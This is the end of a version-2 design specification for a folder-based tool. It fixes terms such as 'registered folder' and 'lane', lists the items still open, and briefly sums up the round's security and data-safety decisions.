**Terminology, fixed** (contradiction #21 — v1 used three terms for one concept, including two in a single section): the thing the operator registers is a **registered folder**. Not workspace, not vault, not project root. A **lane** is a status folder; never "column" in code. The **live set** means everything the grammar includes after archive and ignore exclusion.

---

## 22. What is genuinely open

Small, and none of it blocks a builder.

- **Filter-bar facets per tab** — enumerate at build time; quick-open covers the main find-need, so this is lower-stakes than it was.
- **Objectives** as a possible future tab.
- **The editable table grid** — deliberately post-v1, revisited only if daily use proves the pain is real (§12).
- **Footnote rendering fidelity** — round-trips safely today, renders plainly (§19).

Everything else v1 listed as open has been closed by decision or by rule. **NFC/NFD and the chatroom match pattern were both mis-filed in v1 as non-blocking housekeeping; both had data-integrity consequences and are now law (§4, §14).**

---

*v2 closes round 2. The security model is externally ratified — the security review blessed both tailnet exceptions and promoted the two-listener pattern into a standing convention. The data-safety model now specifies mechanics rather than slogans, and the editor decision removed the largest corruption vector in the design rather than mitigating it.*
